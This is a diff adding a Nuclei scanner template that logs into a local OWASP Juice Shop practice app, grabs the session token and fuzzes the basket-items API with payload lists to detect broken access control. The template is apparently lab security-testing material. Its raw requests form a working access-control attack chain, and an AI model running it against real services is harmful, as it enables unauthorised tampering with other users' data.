@@ -1,0 +1,88 @@
+id: basket-items-auth-flow_broken-access-control
+
+info:
+  name: Basket Items API with Auth Flow Fuzz
+  author: your_name
+  severity: info
+  description: |
+
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"trycyber@gmail.com","password":"trycyber"}
+
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
+  - raw:
+      - |
+        GET /rest/basket/6 HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+    extractors:
+      - type: regex
+        name: id
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '"id":\s*(\d+)'
+
+
+  - raw:
+      - |
+        POST /api/BasketItems/ HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+
+        {   
+            "ProductId":1,
+            "BasketId":"{{id}}",
+            "{{key}}":"{{value}}",
+            "quantity":1
+        }
+
+    attack: clusterbomb
+    payloads:
+      key: /home/parrot/nuclei-templates/http/vulnerabilities/juice-shop/Broken-access-control/key.txt
+      value: /home/parrot/nuclei-templates/http/vulnerabilities/juice-shop/Broken-access-control/value.txt
+    
+    stop-at-first-match: true
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "SQLITE_CONSTRAINT: FOREIGN KEY constraint failed"
+
+
+
